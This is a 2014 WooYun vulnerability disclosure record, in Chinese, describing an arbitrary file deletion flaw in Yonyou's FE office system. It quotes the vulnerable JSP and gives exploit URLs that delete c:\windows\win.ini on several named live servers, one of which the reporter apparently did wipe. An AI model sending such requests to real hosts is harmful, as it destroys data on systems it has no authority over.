{"id": 49199, "wybug_id": "wooyun-2014-075068", "wybug_title": "用友某系统任意文件删除漏洞", "wybug_corp": "用友软件", "wybug_author": "路人甲", "wybug_date": "2014-09-05 16:54", "wybug_open_date": "2014-12-01 16:56", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-10：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-01：\t细节向公众公开  简要描述： 用友FE协同办公系统某处验证不严，导致任意文件删除漏洞 详细说明：  漏洞影响版本V5.5.2漏洞文件：/sys/file_setup/deletefolder.jsp?path=漏洞参数：path/sys/file_setup/deletefolder.jsp源代码如下：---------------------------------------------<%\tString path=request.getParameter(\"path\");\tif(path==null|| \"\".equals(path))\t  path=(String)request.getAttribute(\"path\");\t if(path==null||path.equals(\"\")){           out.println(\"你没有权限访问或者设置根目录，请联系系统管理员\");           return;     }    if(path==null)path=\"\";\t\t  String delPath=path;\t\t  delPath=delPath.replace(java.io.File.separatorChar,'/');\t\t    File delFile=new File(delPath);\t\t    boolean is=false;\t\t    if(delFile.exists()){\t\t      is=delFile.delete();\t\t    }\t\t    if(is){\t\t  %>\t\t     <script language=\"javascript\">\t\t\t\t\t\t\t alert(\"删除成功！\");\t\t\t\t var reloadSrc=parent.westFrame;\t\t\t\t reloadSrc.location.href=reloadSrc.location.href;\t\t\t </script>\t\t  <%\t\t   }\t\t   else{\t\t    %>\t\t    <script language=\"javascript\">\t\t\t\t\t\t\t alert(\"文件被其他人员打开，稍候再删除！\");\t\t\t\t var reloadSrc=parent.westFrame;\t\t\t </script>\t\t    <%\t\t   }%>---------------------------------------------------path参数用户可控，并且没有进行文件路径验证，导致任意文件删除漏洞！   漏洞证明：  以http://oa.hzuf.com:9090 作为测试案例：1)第一次访问：http://oa.hzuf.com:9090/sys/file_setup/deletefolder.jsp?path=c:\\windows\\win.ini\n\n可以看到系统提示：”删除成功”!2)第二次访问：http://oa.hzuf.com:9090/sys/file_setup/deletefolder.jsp?path=c:\\windows\\win.ini\n\n根据源代码逻辑可以判断，系统文件c:\\windows\\win.ini已经被成功删除。c:\\windows\\win.ini文件已经被删除了，审核测试的时候可以换成其他文件，或者换下其他网站进行测试其他测试案例:http://119.145.194.122:9090/sys/file_setup/deletefolder.jsp?path=c:\\windows\\win.ini http://220.168.210.109:9090/sys/file_setup/deletefolder.jsp?path=c:\\windows\\win.inihttp://oa.chnjcdc.com:9090/sys/file_setup/deletefolder.jsp?path=c:\\windows\\win.ini http://oa.shunhengli.com:9090/sys/file_setup/deletefolder.jsp?path=c:\\windows\\win.ini http://oa.linya.cn:9099/sys/file_setup/deletefolder.jsp?path=c:\\windows\\win.ini    修复方案：  权限控制   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-01 16:56 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-01 17:28 |    \t\tshe11 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 混个脸熟)\t\t \n  哥们你太狠了，真删啊。    \n     2014-12-02 15:21 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  @wangl 碰到个比你还狠的。    \n     2014-12-02 16:12 |    \t\tWangl \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 新浪支付，值得拥有)\t\t \n  @char 还是这小哥牛B。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}